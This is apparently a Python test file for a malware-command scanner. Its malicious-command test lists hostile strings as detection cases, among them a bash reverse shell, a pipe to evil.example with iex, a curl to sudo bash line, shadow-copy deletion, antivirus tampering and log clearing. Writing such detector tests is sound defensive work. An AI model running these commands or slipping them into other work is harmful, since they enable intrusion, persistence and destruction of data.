import unittest

from secscan.rules import EICAR, contains_eicar, match_rules


def ids(text, scope="code"):
    return {r.id for r, _ in match_rules(text, scope)}


class RuleTests(unittest.TestCase):
    def test_malicious_commands(self):
        cases = {
            "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAA=": {"ps-encoded", "ps-hidden"},
            "IEX (New-Object Net.WebClient).DownloadString('http://x/a')": {"ps-download-exec"},
            "irm https://evil.example/p.ps1 | iex": {"ps-download-exec"},
            "powershell -ExecutionPolicy Bypass -File a.ps1": {"ps-bypass"},
            "vssadmin.exe Delete Shadows /All /Quiet": {"shadow-delete"},
            "certutil -urlcache -split -f http://x/a.exe a.exe": {"certutil-abuse"},
            "mshta.exe http://x/a.hta": {"mshta-remote"},
            "regsvr32 /s /n /u /i:http://x/a.sct scrobj.dll": {"regsvr32-remote"},
            "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"": {"rundll32-script"},
            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1": {"reverse-shell"},
            "./xmrig -o stratum+tcp://pool.example:3333": {"crypto-miner"},
            "Set-MpPreference -DisableRealtimeMonitoring $true": {"defender-tamper"},
            "Add-MpPreference -ExclusionPath C:\\Users": {"defender-tamper"},
            "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d y": {"reg-run-key"},
            "c^m^d^.^e^x^e /c whoami": {"caret-obfuscation"},
            "netsh advfirewall set allprofiles state off": {"disable-firewall"},
            "wevtutil cl Security": {"clear-logs"},
            "curl -s http://x/i.sh | sudo bash": {"pipe-to-shell"},
        }
        for text, expected in cases.items():
            with self.subTest(text=text):
                self.assertTrue(expected <= ids(text), "%s -> %s" % (text, ids(text)))

    def test_benign_commands(self):
        for text in [
            '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --no-startup-window',
            "powershell.exe -ExecutionPolicy RemoteSigned -File C:\\scripts\\backup.ps1",
            "C:\\Windows\\system32\\svchost.exe -k netsvcs -p",
            "/usr/bin/python3 /usr/lib/update-notifier/apt-check",
            "Get-ChildItem C:\\ | Sort-Object Length",
            "echo Hello World",
            "git commit -m 'encrypted config files'",
        ]:
            with self.subTest(text=text):
                self.assertEqual(ids(text), set())

    def test_ransom_note_scope(self):
        self.assertIn("ransom-note", ids("Your files have been encrypted. Pay in bitcoin.", "note"))
        self.assertIn("ransom-note", ids("你的檔案已被加密", "note"))
        self.assertNotIn("ransom-note", ids("Your files have been encrypted.", "code"))

    def test_eicar(self):
        self.assertEqual(len(EICAR), 68)
        self.assertTrue(contains_eicar(EICAR.encode() + b"\r\n"))
        self.assertFalse(contains_eicar(b"hello"))


if __name__ == "__main__":
    unittest.main()
